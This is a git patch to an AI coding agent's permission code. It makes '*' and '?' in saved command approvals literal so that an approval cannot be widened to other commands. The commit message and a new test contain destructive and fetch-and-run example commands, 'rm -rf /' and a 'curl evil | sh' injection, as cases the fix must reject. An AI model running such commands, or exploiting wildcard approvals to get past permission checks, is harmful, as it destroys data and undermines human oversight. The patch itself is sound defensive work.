@@ -1,0 +1,179 @@
+From 0000000000000000000000000000000000000000 Mon Sep 17 00:00:00 2001
+From: opencode-port <port@localhost>
+Date: Sat, 7 Nov 2026 14:32:20 -0700
+Subject: [PATCH] D109 permissions: wildcard characters from a command or path
+ are literal in its saved approval
+
+Upstream: patterns have no way to say a literal `*` or `?`, and saved approvals are built from command text, so wildcard characters in that text became wildcards. "Always" on `r? notes.txt` saved `r? *`, which matches `rm -rf /`; an exact save such as `sh -c 'rm -f *.log'` matches `sh -c 'rm -f ; curl evil | sh; .log'`; `git '*'` saved `git '*' *`, which matches every quoted git subcommand.
+Fixed: patterns accept `[*]` and `[?]` for a literal `*` and `?` (documented in permissions.mdx), and every saved approval built from a command or an external directory escapes them, so only the trailing ` *` the code adds is a wildcard (`r[?] *`, `sh -c 'rm -f [*].log'`).
+Scenarios: permissions.test.ts "always on a command with wildcard characters approves only that text" (new); shell-classify.test.ts "wildcard characters in commands" (new)
+Upstream tests: test/shell-parse-compatibility.test.ts (asserted `git '*' *`), test/shell-parse.test.ts and test/permission.test.ts (new tests)
+
+diff --git a/packages/core/src/file-access.ts b/packages/core/src/file-access.ts
+index 50c1cc729b..b9bd1c2eca 100644
+--- a/packages/core/src/file-access.ts
++++ b/packages/core/src/file-access.ts
+@@ -10,6 +10,7 @@ import { Location } from "./location.js"
+ import { Permission } from "./permission.js"
+ import { Project } from "./project.js"
+ import { AbsolutePath } from "./schema.js"
++import { Wildcard } from "./util/wildcard.js"
+ import type { SessionErrors } from "./session/error.js"
+ import type { Tool } from "./tool.js"
+ 
+@@ -112,7 +113,8 @@ const layer = Layer.effect(
+           action: "external_directory",
+           directory,
+           resource: slash(path.join(directory, "*")),
+-          save: slash(path.join((yield* Project.root({ exists }, directory)) ?? directory, "*")),
++          // Escaped so that a `*` or `?` in a directory name stays literal in the saved approval.
++          save: slash(path.join(Wildcard.escape((yield* Project.root({ exists }, directory)) ?? directory), "*")),
+         },
+       } satisfies Target
+     })
+diff --git a/packages/core/src/shell/parse.ts b/packages/core/src/shell/parse.ts
+index 562258a4a2..d3d328264a 100644
+--- a/packages/core/src/shell/parse.ts
++++ b/packages/core/src/shell/parse.ts
+@@ -198,7 +198,7 @@ export function scan(command: string, shell: string, cwd: string): Effect.Effect
+         const head = item.resource.slice(0, item.redirectPrefixEnd)
+         const next = item.resource[item.redirectPrefixEnd]
+         const separator = next === "\t" || next === "\n" ? next : " "
+-        output.commands.push({ resource: item.resource, save: `${head}${separator}*` })
++        output.commands.push({ resource: item.resource, save: `${Wildcard.escape(head)}${separator}*` })
+         continue
+       }
+       const words = item.redirectWordCount === undefined ? item.rawWords : item.rawWords.slice(0, item.redirectWordCount)
+@@ -244,26 +244,27 @@ export function scan(command: string, shell: string, cwd: string): Effect.Effect
+         if (directoryCommand === parts && resolved.complete) continue
+       }
+       const selected = powershell ? prefix(words) : bashPrefix(words)
+-      const prefixed = selected && `${selected.join(" ")} *`
++      // Command text is escaped, so only the added trailing `*` is a wildcard: `r? x` must not approve `rm`.
++      const prefixed = selected && `${Wildcard.escape(selected.join(" "))} *`
+       // A command that only the shell can identify is saved exactly as approved. So is one whose resource starts with
+       // assignments or redirects (`FOO=1 git status`): a prefix of its words would never match it, and dropping them
+       // would approve the command under any other environment.
+       const conventional =
+-        prefixed && (powershell || Wildcard.match(item.resource, prefixed)) ? prefixed : item.resource
++        prefixed && (powershell || Wildcard.match(item.resource, prefixed)) ? prefixed : Wildcard.escape(item.resource)
+       const end = selected && item.wordEnds?.[selected.length - 1]
+       // Keep existing grants stable unless normalized spacing loses the original source boundary.
+       const save =
+         !powershell || end === undefined || Wildcard.match(item.resource, conventional)
+           ? conventional
+           : item.resource[end] === "("
+-            ? `${item.resource.slice(0, end)}(*`
++            ? `${Wildcard.escape(item.resource.slice(0, end))}(*`
+             : (() => {
+                 const boundary =
+                   item.wordEnds?.find(
+                     (value) => value >= end && (value >= item.resource.length || /\s/.test(item.resource[value])),
+                   ) ?? end
+                 const separator = /^\s+(?:`(?:\r\n|\r|\n)\s*)?/.exec(item.resource.slice(boundary))?.[0]
+-                return `${item.resource.slice(0, boundary)}${separator ?? " "}*`
++                return `${Wildcard.escape(item.resource.slice(0, boundary))}${separator ?? " "}*`
+               })()
+       output.commands.push({
+         resource: item.resource,
+diff --git a/packages/core/src/util/wildcard.ts b/packages/core/src/util/wildcard.ts
+index 65608026f9..8f3193d037 100644
+--- a/packages/core/src/util/wildcard.ts
++++ b/packages/core/src/util/wildcard.ts
+@@ -4,11 +4,17 @@ export function match(input: string, pattern: string) {
+   const normalized = input.replaceAll("\\", "/")
+   let escaped = pattern
+     .replaceAll("\\", "/")
+-    .replace(/[.+^${}()|[\]\\]/g, "\\$&")
+-    .replace(/\*/g, ".*")
+-    .replace(/\?/g, ".")
++    // `[*]` and `[?]` are a literal `*` and `?` (see `escape`); every other character but `*` and `?` is literal.
++    .replace(/\[([*?])\]|[*?]|[.+^${}()|[\]\\]/g, (token, literal: string | undefined) =>
++      literal ? `\\${literal}` : token === "*" ? ".*" : token === "?" ? "." : `\\${token}`,
++    )
+ 
+   if (escaped.endsWith(" .*")) escaped = escaped.slice(0, -3) + "( .*)?"
+ 
+   return new RegExp("^" + escaped + "$", process.platform === "win32" ? "si" : "s").test(normalized)
+ }
++
++/** A pattern that matches `text` itself, for building patterns from commands and paths. */
++export function escape(text: string) {
++  return text.replace(/[*?]/g, "[$&]")
++}
+diff --git a/packages/core/test/permission.test.ts b/packages/core/test/permission.test.ts
+index 2c7feb7bd8..9d76372d02 100644
+--- a/packages/core/test/permission.test.ts
++++ b/packages/core/test/permission.test.ts
+@@ -1,6 +1,7 @@
+ import { describe, expect, test } from "bun:test"
+ import { Cause, Deferred, Effect, Fiber, Layer, Schema } from "effect"
+ import { Agent } from "@opencode/core/agent"
++import { Wildcard } from "@opencode/core/util/wildcard"
+ import { Database } from "@opencode/core/database/database"
+ import { AppNodeBuilder } from "@opencode/core/effect/app-node-builder"
+ import { LayerNode } from "@opencode/util/effect/layer-node"
+@@ -468,6 +469,17 @@ describe("Permission", () => {
+   }
+ })
+ 
++describe("Wildcard", () => {
++  test("matches [*] and [?] literally", () => {
++    expect(Wildcard.match("ls *.txt", "ls [*].txt")).toBe(true)
++    expect(Wildcard.match("ls a.txt", "ls [*].txt")).toBe(false)
++    expect(Wildcard.match("r? x", "r[?] *")).toBe(true)
++    expect(Wildcard.match("rm x", "r[?] *")).toBe(false)
++    expect(Wildcard.match("echo [*]", Wildcard.escape("echo [*]"))).toBe(true)
++    expect(Wildcard.match("echo [x]", Wildcard.escape("echo [*]"))).toBe(false)
++  })
++})
++
+ describe("shell scanner permission impact", () => {
+   // Fixed cases require matching outcomes; remaining differences are investigation snapshots, not contracts.
+   // These service-level cases all have command resources; tool tests cover skipped checks and directories.
+diff --git a/packages/core/test/shell-parse-compatibility.test.ts b/packages/core/test/shell-parse-compatibility.test.ts
+index bdf7943375..c3036442d4 100644
+--- a/packages/core/test/shell-parse-compatibility.test.ts
++++ b/packages/core/test/shell-parse-compatibility.test.ts
+@@ -97,7 +97,7 @@ const compatibilityCases: Array<[string, string, Record<string, string>, ShellPa
+       {},
+       { commands: [{ resource: 'npm "run" test', save: 'npm "run" *' }], directories: [] },
+     ],
+-    ["bash", "git '*'", {}, { commands: [{ resource: "git '*'", save: "git '*' *" }], directories: [] }],
++    ["bash", "git '*'", {}, { commands: [{ resource: "git '*'", save: "git '[*]' *" }], directories: [] }],
+     [
+       "bash",
+       "FOO=bar git status",
+diff --git a/packages/core/test/shell-parse.test.ts b/packages/core/test/shell-parse.test.ts
+index 9ea6e5aedb..ea8bd0381f 100644
+--- a/packages/core/test/shell-parse.test.ts
++++ b/packages/core/test/shell-parse.test.ts
+@@ -67,6 +67,16 @@ describe("ShellParse", () => {
+     expect(Wildcard.match("LD_PRELOAD=x git status", result.commands[0]!.save)).toBe(false)
+   })
+ 
++  test("escapes wildcard characters from the command in saved patterns", async () => {
++    const result = await Effect.runPromise(
++      ShellParse.scan("r? notes.txt; sh -c 'rm -f *.log'", "/bin/bash", "/workspace"),
++    )
++    expect(result.commands.map((command) => command.save)).toEqual(["r[?] *", "sh -c 'rm -f [*].log'"])
++    expect(Wildcard.match("rm -rf /", result.commands[0]!.save)).toBe(false)
++    expect(Wildcard.match("sh -c 'rm -f ; curl evil | sh; .log'", result.commands[1]!.save)).toBe(false)
++    expect(Wildcard.match("sh -c 'rm -f *.log'", result.commands[1]!.save)).toBe(true)
++  })
++
+   test("rejects malformed syntax with an explicit scanner error", async () => {
+     const malformed = await Effect.runPromiseExit(ShellParse.scan('echo "', "/bin/bash", "/workspace"))
+     expect(malformed).toMatchObject({
+diff --git a/services/site/src/docs/content/permissions.mdx b/services/site/src/docs/content/permissions.mdx
+index b5acd30b4b..bebde2eca7 100644
+--- a/services/site/src/docs/content/permissions.mdx
++++ b/services/site/src/docs/content/permissions.mdx
+@@ -63,6 +63,7 @@ Actions and resources use simple whole-value wildcards:
+ | ------- | ------------------------------------------ |
+ | `*`     | Zero or more characters, including `/`    |
+ | `?`     | Exactly one character                     |
++| `[*]`, `[?]` | A literal `*` or `?`                 |
+ | Other   | The literal character                     |
+ 
+ ```jsonc
